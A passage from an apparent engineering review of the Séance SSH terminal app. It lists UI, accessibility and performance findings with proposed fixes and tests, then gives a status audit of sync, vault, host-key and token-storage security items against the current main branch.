  - On Linux/Windows, the documented Ctrl+Shift+T does nothing unless the terminal has focus.
- **Fix:** Bind ⌘T on Apple platforms and Ctrl+Shift+T elsewhere, dropping plain Ctrl+T. Test: with a focused TextField on macOS, Ctrl+T does not call `newTab`; on Linux, Ctrl+Shift+T from the server list does.
- **Effort:** S.

#### S4-17: Tab chips expose neither selected state nor status to assistive tech
- **Severity:** P2. **Category:** a11y. **Status:** KNOWN (SOL-061 gate: "all tab states"). **Confidence:** VERIFIED.
- **Where:** `ui/terminal_pane.dart:581-666` (`_ChipShell`: an InkWell with a Text and no `Semantics(selected:)`) and `:965-987` (`_TabStatusDot`: an Icon with no `semanticLabel`).
- **Fix:** Wrap the chip in `Semantics(selected: selected, button: true, label: '$label, ${status.description}${dirty ? ', unsaved' : ''}')`, with `ExcludeSemantics` on the dot and close icon, plus a separate "Close tab" action via `customSemanticsActions`. Test: `tester.getSemantics(find.text('Session 1'))` matches `isSelected: true` and contains "connected".
- **Effort:** S.

#### S4-18: Top toasts are silent and time out under the pointer
- **Severity:** P3. **Category:** a11y. **Status:** partly KNOWN (SOL-061 "live safety notices"). **Confidence:** VERIFIED.
- **Where:** `ui/top_toast.dart:173` (`Timer(widget.toast.duration, _dismiss)`, not paused on hover or focus) and `:208-265` (no `Semantics(liveRegion: true)`).
- **Failure scenario:** A screen-reader user never hears "The OS keyring is locked… Retry". A mouse user reading the 12 s toast loses it, and its Retry action, while hovering over it.
- **Fix:** Wrap the card in `Semantics(liveRegion: true, container: true)` and call `SemanticsService.announce` for platforms that ignore live regions. Pause the timer in `MouseRegion.onEnter` and `Focus.onFocusChange`, and resume on exit. Test: the semantics node has the `isLiveRegion` flag; hovering past the duration keeps the toast.
- **Effort:** S.

#### S4-19: Narrow-width chrome polish
- **Severity:** P3. **Category:** visual/layout. **Status:** NEW. **Confidence:** VERIFIED (captures).
- **Update banner:** `ui/server_list_pane.dart:877-928`. In `caps/shell-update-banner-narrow-rail.png`, at the 200 px minimum rail (a 1000 px window), "Séance 1.4.0 is available." breaks into a 10-line column "Sé/an/ce/1.4/…". The phone capture `caps/phone-home-320-ts15.png` breaks "availabl/e.". Fix: when the width is under about 260, stack the text over the actions, or make the whole banner tappable with just a close ×.
- **Utility tab labels:** `ui/sidebar_panel.dart:121,160-205` show "Assist…" and "Snipp…" at the pane's own minimum width of 260 (`caps/shell-960x700-dark.png`). Fix: switch to glyph-only (label as tooltip) when the label doesn't fit, not only below 40 px.
- **Phone home app bar:** `server_list_pane.dart:266-303` reduces the title to "S…" at 320 px and 1.5x. Fix: move Import into an overflow menu.
- **Test:** a 200/260/320-width matrix in `server_list_capture_test.dart` asserting that the banner Text's line count is at most 2.
- **Effort:** S.

#### S4-20: Selection paint walks every selected line on every frame
- **Severity:** P3. **Category:** performance. **Status:** NEW. **Confidence:** VERIFIED (trace).
- **Where:** `third_party/xterm/lib/src/ui/render.dart:729-747` and `core/buffer/range_line.dart:16-23`. A `sync*` generator runs from `begin.y`; the loop just `continue`s until `firstLine`.
- **Failure scenario:** After Select All over 10k lines of scrollback, streaming output repaints every frame. Each paint allocates about 10k `BufferSegment`s and iterates them. Search highlights (S4-K) will hit the same loop in `_paintHighlights`.
- **Fix:** Add `BufferRange.segmentsWithin(int firstLine, int lastLine)`, clamping `i` to `max(begin.y, firstLine)..min(end.y, lastLine)`. Use it in `_paintSelection` and `_paintHighlights`, and cull highlights by their range first. Test: a counting `BufferRange` subclass asserts at most one segment per visible line per paint.
- **Effort:** S.

#### S4-21: Keyboard-interactive dialog: Enter doesn't submit
- **Severity:** P3. **Category:** UX. **Status:** KNOWN (SOL-021: "verified Next/Done traversal"). **Confidence:** VERIFIED.
- **Where:** `ui/keyboard_interactive_dialog.dart:106-127`. No `onSubmitted` and no `textInputAction`; the reveal IconButton is in the Tab order.
- **Failure scenario:** Type a TOTP code and press Enter: nothing happens.
- **Fix:** Use `textInputAction: last ? done : next` and `onSubmitted: last ? _submit : (_) => focusNodes[i+1].requestFocus()`, with the reveal button at `focusNode: FocusNode(skipTraversal: true)`. Test: enter text, press Enter, and expect the answers to be returned. With two prompts, the first Enter moves focus to the second field.
- **Effort:** S.

#### S4-22: The server editor opens without focus and hides its actions
- **Severity:** P3. **Category:** UX. **Status:** NEW. **Confidence:** VERIFIED (capture).
- **Where:** `ui/server_editor.dart:439-565`. No `autofocus` anywhere in the file. The action row and the test result sit at the end of a `SingleChildScrollView`: `caps/editor-1024-edit.png` at 700 px tall shows no Save button. The phone editor is a roughly 280 px wide inset dialog (`caps/editor-360-new.png`).
- **Fix:**
  - Autofocus Label (new) or Host.
  - Pin the actions and test-result row outside the scroll view (`Column[Expanded(scroll), actions]`).
  - Use `Dialog.fullscreen` below 600 px.
  - Test: `showServerEditor` gives the Label field focus, and the Save button is hit-testable at 1024x700 without scrolling.
- **Effort:** S.

#### S4-23: Terminal palettes don't match the slate chrome; resize handles form bands
- **Severity:** P3. **Category:** theming/visual. **Status:** NEW. **Confidence:** VERIFIED (captures).
- **Where:**
  - `ui/terminal_appearance.dart:36-41`: the dark background `#15141B` is "matching the app's dark surfaces", but those are now slate (`theme.dart:62-63`, `#232932`).
  - The light terminal is warm `#FAF8F5` against a cool white/grey chrome.
  - `ui/adaptive_shell.dart:404-418`: the 10 px handles paint the Scaffold surface between differently toned panes, with no hover feedback.
- **Fix:** Re-tune the built-in terminal backgrounds toward the sibling neutrals (dark: `containerLowest` `#1C2128`; light: `#FCFCFD`). Paint the handles transparent over the rail tone, and show the divider in `primary` on hover or drag. Update the stale comment. Test: the golden or capture matrix, plus `terminal_appearance_test.dart` contrast of the ANSI colours against the new backgrounds (at least 4.5:1, as the light palette promises).
- **Effort:** S.

#### S4-24: Hand cursor over links that a plain click won't open
- **Severity:** P3. **Category:** UX. **Status:** NEW. **Confidence:** VERIFIED.
- **Where:** `third_party/xterm/lib/src/terminal_view.dart:356-363, 391` (hover sets `click` for any link) versus `:423-429` (opening requires ⌘/Ctrl or touch).
- **Fix:** Show the click cursor and an underline only while the modifier is held, re-evaluating on `HardwareKeyboard` changes. Otherwise keep the text cursor and add a tooltip "⌘-click to open". Test: hover a URL without Ctrl and expect `SystemMouseCursors.text`; with Ctrl held, expect `click`.
- **Effort:** S.

#### S4-25: Git change letters use accent-derived colours
- **Severity:** P3. **Category:** theming. **Status:** NEW. **Confidence:** VERIFIED.
- **Where:** `ui/git_pane.dart:699-706`. 'A'/'C' use `scheme.primary` (the user accent: violet by default, possibly illegible after S4-09) and 'M' uses `tertiary`. AGENTS.md §7 asks for `FamilyPalette.glyph(hue)`, and Git's own convention is added green, modified amber, deleted red.
- **Fix:** Map to `FamilyHue.green/amber/red/blue` via `FamilyPalette.of(context).glyph`. Test: a golden or colour assertion per letter.
- **Effort:** S.

#### S4-26: Import dialog leaks its controller
- **Severity:** P3. **Category:** stability. **Status:** NEW. **Confidence:** VERIFIED.
- **Where:** `ui/server_list_pane.dart:788-824`. `TextEditingController()` is created per open and never disposed. The repo elsewhere uses a StatefulWidget-owned controller to avoid dispose-during-exit-animation problems (`terminal_pane.dart:498-559`).
- **Fix:** Extract `_ImportSshConfigDialog` as a StatefulWidget that owns the controller. While there, add "Read ~/.ssh/config" on desktop.
- **Effort:** S.

#### S4-K: Known gaps confirmed still present
- **Scrollback search** (SEA-023). There is no find in `_handleKeyEvent` (`terminal_pane.dart:1130-1208`). The fork has `TerminalController.highlight()` (`controller.dart:168`) and search theme slots, so the pieces exist. See S4-20 for the paint culling it needs.
- **Tab navigation** (SEA-025). There is no close (⌘W / Ctrl+Shift+W), select 1-9, next/previous (Ctrl+Tab / ⌘⇧[ ]), clear scrollback, or pane-focus shortcut. The macOS storyboard (`MainMenu.xib`) has no Close item.
- **Last output on disconnect** (SEA-026). `_Disconnected` replaces the scrollback with a placeholder (`terminal_pane.dart:1080-1082, 1288-1320`). The connection-failed view also has no "Edit server…" action (`caps/shell-conn-error-1280.png`).
- **Layout** (SEA-015 / SOL-039).
  - The breakpoint is still 960, and a 959 px desktop window gets the phone home with a FAB. The terminal isn't shown even with live sessions unless `_open` set `_viewingTerminal` (`caps/shell-959x700-dark.png`).
  - The utility pane can't be collapsed: at 1024 px the terminal is 480 px (`caps/shell-1024x700-light.png`).
  - The phone drawer is still a fixed `Drawer(width: 380)` (`terminal_pane.dart:77-80`).
  - The resize handles have no keyboard or semantics support (`adaptive_shell.dart:391-421`).
- **Quick connect / command palette** (Planchette): absent. `grep` finds only the kit's "unsaved rows" support (`sidebar_kit.dart:1265`).
- **Touch targets** (SOL-061). Tab close is 28x28 and strip buttons are 40x38 on phones.

### 3. Best PR candidates

1. **S4-04: keep the "Include terminal output" opt-out** (privacy, about 40 lines plus a test).
   - Add `bool includeTerminalContext = true` to `ChatSession` (`services/chat_session.dart`), notifying on change.
   - `ChatSidebar` reads and writes it instead of its own field.
   - Write the regression test first: `zz_s4_chat_toggle_test.dart` already reproduces it. Copy it to `test/chat_sidebar_test.dart` and expect `selected == false` after reopening the drawer.
   - Add a unit test that `_send` with the flag off calls the provider with `terminalContext: null`. Reuse the fake-provider seam in `chat_sidebar_test.dart`.
   - Optional follow-up: persist it as a device setting.

2. **S4-07: new tabs use the stored config** (about 10 lines plus a test).
   - First write a failing test in `test/session_tabs_test.dart`: a fake open session on server A; `saveServer(A.copyWith(port: 2222))`; `openNewTab(state)`; expect the active session's `config.port == 2222`. Add a second case through `TerminalTabStrip.onNewTab`.
   - Then change `AppState.newTab` to `final fresh = _configFor(config.id) ?? config;` and use `fresh` for `serverId`, `config` and the insert index.
   - No caller changes, which matches `reconnect`'s documented intent.

3. **S4-01: stop flushing terminal glyph caches on unrelated notifications** (about 80 lines).
   - Fork tests first:
     - `TerminalStyle(fontSize: 13, fontFamilyFallback: ['a']) == TerminalStyle(fontSize: 13, fontFamilyFallback: ['a'])`.
     - A pumped `TerminalView` re-pumped with an equal new style leaves `renderTerminal.debugNeedsLayout == false`.
   - Implement `==`/`hashCode` on `TerminalStyle` (with `listEquals`) and `TerminalTheme` (all 23 colours plus the search slots). Note it in `third_party/xterm/PATCHES.md`.
   - App test (from `zz_s4_restyle_test.dart`): after `focusTab`, each view's style is `==` its previous one.
   - Low regression risk: a value change still differs, and `terminal_appearance_test.dart` covers the values.

4. **S4-08: quit guard** (about 200 lines).
   - Test first in `test/quit_guard_test.dart`:
     - Create an `EditorTab` with `dirty.value = true`, pump the shell, and `await tester.binding.handleRequestAppExit()` inside `runAsync`. Expect a dialog; tap Cancel; expect `AppExitResponse.cancel`.
     - With a clean state, expect `exit` and no dialog.
     - With one connected session, expect a dialog naming it.
   - Implement: an `AppLifecycleListener(onExitRequested:)` owned by `_BootstrapState` once `_state` exists, showing a dialog on `navigatorKey.currentContext`. Mirror Poltergeist's `attachAppSessionLifecycle` / `QuitGuard`.
   - The settings-window exit forwarding already routes ⌘Q to this isolate (STATUS:288-295).

5. **S4-02: tab strip overflow** (about 180 lines).
   - Tests first in `test/terminal_tab_strip_test.dart`:
     - 12 tabs in a 600 px-wide strip with the last active: after `pump()`, `tester.getRect(activeChip)` lies within the strip's rect.
     - `sendEventToBinding(PointerScrollEvent(scrollDelta: Offset(0, 120)))` over the strip moves the offset.
     - An overflow button exists only when the tabs overflow, and choosing an item calls `onFocus` with that id.
   - Implement: a controller, per-chip GlobalKeys, `ensureVisible` in a post-frame callback on `activeTabId` change, a pointer-signal listener, and a `MenuAnchor` overflow list reusing `sessionTabLabel` / `editorTabLabel`.

6. **S4-11: one monospace style everywhere** (mechanical, about 60 lines).
   - Test first: `test/mono_font_usage_test.dart` scans `lib/` for the literal `fontFamily: 'monospace'` and expects none. Also a widget test that the host-key fingerprint's style has `fontFamilyFallback` containing `Menlo` and `Consolas`.
   - Implement `SeanceTheme.mono(...)` and replace the 20 sites.
   - Near-zero regression risk on Linux; it fixes Apple fingerprint legibility.

Next in line: S4-05 (reflow; M effort, core-terminal risk, but the probes are ready as tests), S4-13 and S4-14 (known, tiny), and S4-12 (TOFU dialog).

### 4. Ideas

- **Quick connect in the filter.** Typing `user@host[:port]` in the server filter shows an italic "Connect to deploy@10.0.0.5" row. The sidebar kit already supports unsaved italic rows (`sidebar_kit.dart:1265`). Pressing Enter opens a session that isn't saved; "Save…" appears in its row menu. First slice: parse the query with the existing ssh-target parser, show the synthetic row, and connect through the same TOFU and auth path.
- **Tab switcher ("séance table").** The overflow button (S4-02) grows into ⌃Tab / ⌘⇧P, a floating list of all tabs across servers with the live dot, cwd, running command (already in `SessionMetadata`) and a type-to-filter box. First slice: the overflow menu, reused as the ⌃Tab popup with ↑/↓/Enter.
- **Search with scrollbar ticks.** Scrollback search (SEA-023) with hit marks painted in a thin overview strip beside the terminal, like editors do, so you can see where matches cluster in 10k lines. First slice: a Ctrl+Shift+F / ⌘F bar that finds on `buffer.lines` in chunks of about 500 lines per frame and highlights hits via `controller.highlight`, with viewport-culled painting (S4-20).
- **Production tint.** For servers coloured red or in a group named `prod*`, mix 3-4% of the server hue into the terminal background and cursor, and ask for confirmation on multi-line pastes. First slice: an opt-in `ServerConfig` flag that uses `serverAccent(...).line` at low alpha behind the grid, plus a paste-preview dialog when the text contains a newline.
- **Glyph-run painting.** The fork draws each cell as its own `Paragraph` (`painter.dart:150-160`). Grouping runs of cells with the same style into one paragraph would cut `drawParagraph` calls about 10x on typical screens. First slice: benchmark `paintLine` at 200x60 with the existing harness, then add run batching behind a flag with golden comparisons.
- **Linux terminal conventions.** An opt-in "copy on select" and middle-click paste (pasting the last in-app selection, since Flutter lacks PRIMARY). First slice: a setting and a `TerminalController` listener that copies on selection end; middle-click in `TerminalView` pastes it.
- **Tab drag-reorder and "move to new window".** The kit has drop-indicator plumbing; start with reordering within a server's strip, persisted in `tabs` order.
- **"Jump to live" pill** (AST-011 idea). While you are scrolled up and output arrives, a small "↓ 37 new lines" pill appears at the bottom-right of the terminal. First slice: use `RenderTerminal.stickToBottom` (already exposed) and the lines length as of when you scrolled away.

---

## S5: ANALYSIS.md audit against current main

Audited: 2026-09-26. Code state: `origin/main` = `dd7e105` (HEAD of the checkout).
ANALYSIS.md base: `791d86e` (2026-09-05). Read-only audit; nothing was built or
run (no Dart/Flutter SDK in this container), so every "DONE" below is proven by
code and commit ancestry, not by a test run.

Caveat: the clone is **shallow** (`.git/shallow` grafts at `d18f1ac`, `a6b3489`,
`7108c90`, `877d185`, ...). `git log -S` "origin" answers that land on a graft
commit mean "at or before", so PR attribution below uses first-parent
ancestry of main (which merge first contains the commit) and, where it
mattered, `git show <merge>:<file>` comparisons.

Status legend: **DONE** (fully implemented), **PARTIAL** (sub-items split
below), **OPEN** (still accurate), **STALE** (entry text/evidence no longer
matches code; the accurate statement is given). Paths are repo-relative to
`/home/user/Seance`.

### PRs landed since the consolidation base (first-parent merges of main)

| PR | What landed (relevant to the backlog) |
|---|---|
| #72 | Exclude a server from sync (retraction tombstones, re-inclusion) |
| #73 | Duplicate server; introduced `AppState._mutate` queue (saves, deletes, duplicates and sync rounds serialized) |
| #74 | Test connection (`test_connection.dart`, `UnpinnedHostKeyStore`); `plannedCredential` persists referenced-key passphrase |
| #75 | Z.AI web search backend |
| #76 | Assistant settings sync (keys included) |
| #77 | Pooled SSH keepalive controls (core) |
| #78 | Upload CAS tests with hashing off |
| (direct) `4a50782` | Serialize periodic probe sweeps |
| #80, #81 | Identity audit log hardening |
| #82, #83 | Prompt-dialog route guards; scrollable host-key review |
| **#49** | Runaway escape-sequence cap (merged 2026-09-11, `eef9fb9`, commit `99533e3`) |
| **#47** | Desktop window-state persistence (merged 2026-09-11, `c7a9813`, commits `f6eada3`, `d47d58d`, `972db10`) |
| #84 | Server + snippet delete tombstones (`f9d52bd`, `3e4f3cc`, `8963caa`) |
| #85, #86, #87 | macOS picker deprecation; dependency upgrade; Add-button overlap |
| #89 | Font picker, 77-glyph/emoji/image marks, selection bounded by content |
| #90, #92 | Push batching to server limits; blob cap advertised, over-cap record pushed alone |
| #91 | Current-state bugfixes (see `docs/review-2026-09-12.md`) |
| #93, #94 | Emoji-mark validation; macOS floor cleanup |
| #95 | Vault ops serialized; re-key in one write |
| (direct) `6f3d7f3` | Mislabeled "Fixed Mac accessibility crasher": actually credential versioning (`Secret.updatedAt`, `putLocalSecret`) + CSI zero-count normalization |
| #98 | Finish credential versioning + re-key rollback |
| #96 | Compact rows and pinning |
| #97 | GLM review timeout |
| #99 | Heal unreadable credential from its record |
| #100 | Crash-safe vault re-key journal |
| #101-#106 | List signals, custom colours, SVG marks, colour line, **OSC 8 hyperlinks (#103)**, git sidebar (#105), session ring |
| (direct) `172924a`, `25f6e43` | Editor line numbers/status bar; editor opens as a tab |
| #123-#125 | Sidebar kit port; Android back keeps sessions; densities; blocked-row state |
| #126 | Settings in its own desktop window |
| #127 | Family colour vocabulary |
| #128 | Themes + Appearance tab |
| #129, #130 | Mobile filter/compact rows (40 dp); tabs switch in place |
| #131 | **ssh-agent auth + ProxyJump execution** |
| #109-#113 | Dependabot action bumps (Dependabot config added in `15d0fdd`) |

#### Legacy PR references in ANALYSIS.md

| PR | Status in main |
|---|---|
| #44 local shell | **Not landed.** No local-shell/PTY code or dependency anywhere in `app/` or `packages/`; no matching commit in `git log --all`. GitHub state not checked (per instructions). |
| #45 macOS sandbox migration | **Not landed.** No migration code; `macos/Runner/*.entitlements` still `com.apple.security.app-sandbox`. GitHub state not checked. |
| #47 window state | **Landed** 2026-09-11 (`c7a9813`). |
| #49 parser | **Landed** 2026-09-11 (`eef9fb9`). |

### Entry-by-entry audit

#### Front matter

| Entry | Status | Evidence | Remaining work (next step) |
|---|---|---|---|
| Header ("PRs #64-71 merged; verified at 791d86e") | STALE | main is `dd7e105`; ~40 PR merges since (table above). | Re-baseline the header to `dd7e105` and add #72-#131 to the ledger. |
| Assessment and evidence | PARTIAL (still true in substance) | Largest risks unchanged (SOL-011, AST-008, SOL-031/035 open). `screenshot.png` last changed at or before 2026-09-05 (predates sidebar #123, themes #128). New capture tooling exists: `app/seance_app/test/server_list_capture_test.dart`, `family_hues_capture_test.dart`, `docs/captures/d34-colour/`. | Keep risk paragraph; replace "screenshot historical" with a recapture task; note agent/ProxyJump now exist (#131). |
| Verification tables (263/309/137 ... 320/342/154) | STALE | Latest documented counts disagree: `AGENTS.md:114,317` (746 Dart / 700 Flutter / 245 fork), `docs/STATUS.md:519` (830 Flutter after #123), `docs/review-2026-09-12.md` (667/507/191). Not re-run here. | Run the five commands at HEAD, replace both tables with one current table, fix AGENTS.md counts. |
| Priority and execution / recommended sequence | PARTIAL | "Recoverable vault migration" is largely done (#95/#98/#99/#100); "typed deletes" started (#84). | Drop vault re-key from the sequence; restate as: persistent ledger -> exact acks -> sealed tombstones -> host-key conflict queue. |

#### P0: trust, sync and credentials

| Entry | Status | Evidence | Remaining work (next step) |
|---|---|---|---|
| SOL-011 authenticate routing/conflict metadata | OPEN | `packages/seance_protocol/lib/src/records/record_codec.dart:26-31` seals only `{kind,data}`; `:44` treats `deleted`/empty blob as a tombstone with no authentication; id/updatedAt/deviceId/deleted are plaintext envelope fields (`record.dart:81-110`). Mitigations since: apply-side payload-id == envelope-id checks for config/hostKey/snippet (`sync_coordinator.dart:612-686`, snippet check from #91); `secret:`/`hostkey:` tombstones are never honoured (`sync_coordinator.dart:519-606`). STATUS item 16 is the same issue. | Specify a versioned envelope v2 (AEAD associated data = purpose, schema, key epoch, kind, id, updatedAt, deviceId, deleted); seal tombstones; readers accept v1+v2, writers stay v1 until fixtures + interop tests exist. This is the prerequisite for honouring `secret:`/`hostkey:` tombstones and for retracting pins. |
| SOL-001/005/006/010/037/059 durable ledger, typed deletes, exact acks | PARTIAL | **Done:** server-config and snippet deletes write a durable tombstone before the row drops (`app_state.dart:929-960`, `:1461-1485`; `FileTombstoneStore` `services/file_stores.dart:133-200`), republished each round (`sync_coordinator.dart:184-202`) and pruned when confirmed (`:449-459`) - PR #84, fixes #54 for those kinds. Credentials have their own revision (`Secret.updatedAt` `models/secret.dart:14-19`, `putLocalSecret`; published at their own time `sync_coordinator.dart:160-183`; shared secrets collected once at newest owner's time) - `6f3d7f3` + #98 + #91. Manual, automatic and startup sync all serialize on `AppState._mutate` (`app_state.dart:844-890`, used at `:1546`) since #73. **Open:** mirror is `InMemoryLocalRecordStore()` rebuilt per round (`services/app_services.dart:560`), so every round pulls from 0 and nothing persists origin/cursor/dirty ops; `markSynced(id, seq)` ignores revision (`sync_engine.dart:122`, `local_record_store.dart` `markSynced`) - masked for configs/snippets/secrets only because the queue blocks edits during a round (assistant settings are edited outside it); `collectLocal` re-encrypts every record with this device's `deviceId` (`sync_coordinator.dart:150-157, 176-182, 222-228, 283-290`) so unchanged peer records get re-attributed; no tombstone path for hostKey, secret (refused), assistantSettings, bookmark; global credential opt-out does not tombstone; whole-collection JSON rewrite per `putServer`; no orphan reconciliation for live sessions of remotely deleted configs; queue is held across network I/O (STATUS item 14). | Slice 1: persistent `LocalRecordStore` (file-backed) holding cursor, dirty set, origin deviceId/updatedAt and a local revision counter; stop re-attributing unchanged records. Slice 2: ack only the exact sent revision. Slice 3 (after SOL-011): sealed tombstones for hostKey/secret/assistant. Slice 4: batch apply into one write per store; split fetch from apply (STATUS 14). |
| AST-008 / SOL-023 never silently re-trust synced host keys (#56) | OPEN | `sync_coordinator.dart:650` still `await hostKeyStore.put(pin)` unconditionally (only id/locator equality and excluded-locator skip added, `:633-650`). `TofuVerifier.check/pin` has no serialization or compare-and-set (`packages/seance_core/lib/src/hostkey/tofu.dart:44-67`). `hostKeyLocator` is `'$host:$port'` with no canonicalization (`models/host_key.dart:112`). #56 still listed open (`docs/STATUS.md:1603-1604`). ProxyJump (#131) now adds per-hop TOFU, so more endpoints are exposed. | Route pulled pins through a `HostKeyReconciler` in core: same fingerprint -> keep; no local pin -> adopt; different -> write a durable conflict record (both fingerprints) and keep the local pin; surface in UI; resolution writes a new revision. Canonicalize locator (lowercase, strip trailing dot, IDNA, bracket IPv6). Add CAS `pin(expected:)`. |
| SOL-029 transactional credential editing | PARTIAL | **Done:** referenced-key passphrase is now persisted, carrying the stored PEM (`app/seance_app/lib/ui/server_editor.dart:70-110`, #74); all form values snapshotted before the vault await (`:1050-1075`); agent auth needs no secret (#131). **Open:** passphrase-only edit of a stored pasted key is ignored (`server_editor.dart:85` returns null when PEM box blank); method switch keeps a wrong-kind `secretRef` (`:52-60`, STATUS 18); one passphrase slot serves pasted PEM and referenced file (`:104-110`, STATUS 19); referenced passphrase cannot be cleared (STATUS 17); re-pasting a key with a blank box drops the stored passphrase (STATUS 21); obsolete credentials not removed transactionally. | Make the editor show what is stored (e.g. "passphrase stored" chip with Clear, kind-mismatch notice) and model keep/replace/clear per field; give referenced-key passphrase its own slot; mirror the rule in `resolveCredentials`/`plannedCredential`; extend `planned_credential_test.dart`. |
| SOL-030 recoverable vault re-key | PARTIAL (core DONE) | **Done:** whole-vault staging including unreferenced entries, `vault.json.rekey` journal, settle at startup/unlock/retry, keystore witness read never mints (`services/app_services.dart:273-337, 349-398`; journal in `services/file_stores.dart`), serialized vault queue, owner-only files - PRs #95, #98, #99, #100. `VaultStore.listIds` no longer needed (whole map re-sealed). **Open:** enrollment saves `syncBaseUrl`/username/token *before* the re-key (`app_services.dart:449-454` register, `:503-508` login), so a failed re-key leaves a half-enrolled device; no recovery material shown/exported before the destructive phase; entries the current key cannot open are carried byte-for-byte (STATUS 4). | Move settings/token persistence after `_rekeyVault` succeeds (or roll them back on throw) with a regression test; recovery export moves to SOL-035. |
| SOL-031 missing keystore key is not first run | OPEN | `services/secure_master_key.dart:94-109` `probeKeystore` mints a key after a null read; `services/app_services.dart:166` calls it at bootstrap before any check of vault ciphertext. A non-minting `readKeystoreKey` now exists (`secure_master_key.dart:130-137`). #45 not in main. | At bootstrap use `readKeystoreKey`; if null and `vault.json` has entries (or a re-key journal exists) start `LockedSecretVault` in a "key missing" recovery state instead of minting; mint only for an empty vault; test in `keystore_resilience_test.dart`. |
| SOL-048 hash, expire, revoke bearer tokens | OPEN | `packages/seance_sync_server/lib/src/sqlite_storage.dart:45-48` plaintext `tokens(token, username)`; `createToken` `:112-118`; `usernameForToken` `:120-125`; `DELETE /v1/account` needs only the bearer (`server.dart:217-221`); no logout/list/revoke routes (`server.dart:51-56`). | Store SHA-256(token) + created/expires/last-used/device label; add `POST /v1/logout`, `GET /v1/devices`, revoke endpoints; require verifier re-auth for account delete; migration rotates existing rows. |

#### P1/P2: protocol, recovery and storage

| Entry | Status | Evidence | Remaining work (next step) |
|---|---|---|---|
| SOL-008/009/012/013 strict parsing, deterministic revisions | OPEN | `record.dart:155-163` lenient (`as num).toInt()` truncation, `deleted ?? false`, `blob ?? ''`); DTOs default a missing `protocolVersion` to current (`sync/dtos.dart:34-35, 83-84`); LWW tie falls back to client-supplied `seq` (`records/lww.dart:24-26`) and the server resolves with `incoming.seq` (`sqlite_storage.dart:137-140`); engine does not check one ack per id (`sync_engine.dart:119-129`); `SyncOutcome` has no pending/incomplete state (`:14-20`); ids expose kind and hostnames (`hostkey:host:port` `models/host_key.dart:67`). Only new strictness: `PushLimits.tryFromJson` (#90). | Strict `EncryptedRecord.fromJson` (typed errors, int-only, required fields, length bounds); server strips client `seq` before resolve; engine validates ack set and reports `pendingCount`; keyed-HMAC opaque ids in the SOL-011 migration. |
| SOL-014/016/017/018 remaining KDF/crypto assurance | OPEN | Unchanged since #64. Salt/verifier are raw strings with no shape/length check (`sync/dtos.dart:13, 38, 48, 58`); only a recovery-code KAT exists (`packages/seance_protocol/test/crypto_test.dart:108`), no Argon2id/HKDF/XChaCha vectors; no NFC/NFD policy. | Add base64 + exact-length validation for salt (16) and verifier (32) at client and server; add published Argon2id/HKDF/XChaCha20-Poly1305 vectors to `crypto_test.dart`. |
| SOL-034 serialize persistence / transactional store | PARTIAL | **Done (#91 `98e0ebd`):** per-normalized-path in-process write queue (`services/atomic_file.dart:31-52`); POSIX rename failure rethrows and keeps the destination (`:66-68`); owner-only option; journal read separates I/O failure from damage (#100). **Open:** fixed `<file>.tmp` name (`:58`) is unsafe across processes; no process lock; Windows fallback deletes the destination before renaming (`:69-74`); no directory fsync or backups; loads catch everything and quarantine I/O errors as corruption (`file_stores.dart:31-35, 91-94, 307-314`; `app_settings.dart:523-530`). | Unique temp names + a per-store-dir lock file; in each `_load` propagate `FileSystemException` (retry, do not quarantine) and quarantine only decode errors; keep the deviceId salvage. |
| SOL-035 missing credentials and recovery onboarding | OPEN | Empty-credential fallback still `SshCredentials.password(secret?.value ?? '')` (`services/app_services.dart:689`) and `secret?.value ?? ''` for keys (`:722-725`); `RecoveryKey` exists only in `packages/seance_protocol/lib/src/crypto/recovery_key.dart`, unused by the app; no app lock. Mitigation: new and keyless-imported servers default to ssh-agent (#131; `server_editor.dart:287`, `ssh_config_import.dart:28-37`). | Throw a typed `CredentialMissing` from `resolveCredentials` when `secretRef` is set but the vault has no entry; UI shows "Credential required on this device" with prompt/agent options; then build encrypted export/import using `RecoveryKey`. |

#### SSH and terminal correctness

| Entry | Status | Evidence | Remaining work (next step) |
|---|---|---|---|
| SOL-020/032/033 connection ownership and deadlines | OPEN | Stale result is still closed after the fact (`app_state.dart:1251-1255`); no cancel API; 5-minute auth deadline pre-dates the backlog (`packages/seance_core/lib/src/ssh/ssh_session.dart:19, 1007-1013`); connecting UI is a bare spinner (`ui/terminal_pane.dart:1073-1075`). #131 added per-hop cleanup ownership for jump chains (`ssh_session.dart` ~1040-1070, `test/ssh_proxy_jump_test.dart`). Test connection documents "no cancel seam" (`server_editor.dart:261-262`). | Add a `ConnectAttempt` handle (cancel token closing socket/client/channels per phase) to `openAuthenticatedClient`; Cancel + Copy log on the connecting view; test cancellation while TOFU/k-i dialogs are open. |
| SOL-021 / AST-002 residual typed keyboard-interactive | PARTIAL | #131 (`5d578b9`) added typed `KeyboardInteractiveChallenge {server, prompts, name, instruction}` (`ssh_session.dart:93-110`) and the dialog separates the trusted endpoint from server text. Echo flag still dropped (`ssh_session.dart:661` maps only `promptText`); cancel is still "empty list" (`ui/keyboard_interactive_dialog.dart:5`); no Next/Done traversal or autofill policy. | Add `List<bool> echo` and an explicit `KeyboardInteractiveCancelled` result; wire `textInputAction`/`onSubmitted` between fields skipping reveal buttons. |
| SOL-022; SEA-007/027 SSH config parity and import | OPEN (one minor change) | Paste-only dialog, no preview/dedupe (`ui/server_list_pane.dart:788-823`); fresh UUID per import (`app_state.dart:1134`); last value wins (`ssh_config_import.dart:69`, OpenSSH is first-wins); wildcard defaults dropped (`:74-79`); naive quote/comment stripping (`:94-97, 112`); no Include; `ProxyJump` parsed (`:87`) but not mapped to `jumpHostId` (`:27-40`); empty username kept (`:35`). Changed: keyless hosts import as agent auth (#131). | Rewrite parser: tokenizer with quotes, first-value-wins, apply matching `Host *` defaults per alias, Include with loop guard; preview dialog with dedupe on host/port/user and ProxyJump -> saved-host mapping; file Browse. |
